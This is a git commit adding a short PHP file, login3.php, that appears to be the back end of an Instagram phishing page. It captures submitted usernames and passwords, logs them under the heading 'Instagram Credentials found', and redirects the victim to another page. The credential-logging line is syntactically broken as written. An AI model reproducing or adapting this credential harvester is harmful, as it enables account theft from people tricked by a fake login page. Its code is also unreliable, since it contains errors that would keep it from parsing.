3b760804fea1ed49263a9c48ecd17edd1abd577e
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2021-04-14 17:37:36 +0530

    Add files via upload

---
+++ login3.php
@@ -0,0 +1,8 @@
+<?php
+error_log("-----------------------------------------------------------------------");
+error_log("Instagram Credentials found");
+error_log("[EMAIL]: " . $_POST['username'] ."\n" " [PASS]: " . $_POST['password'] .);
+error_log("-----------------------------------------------------------------------");
+header('Location:/index3.html');
+exit();
+
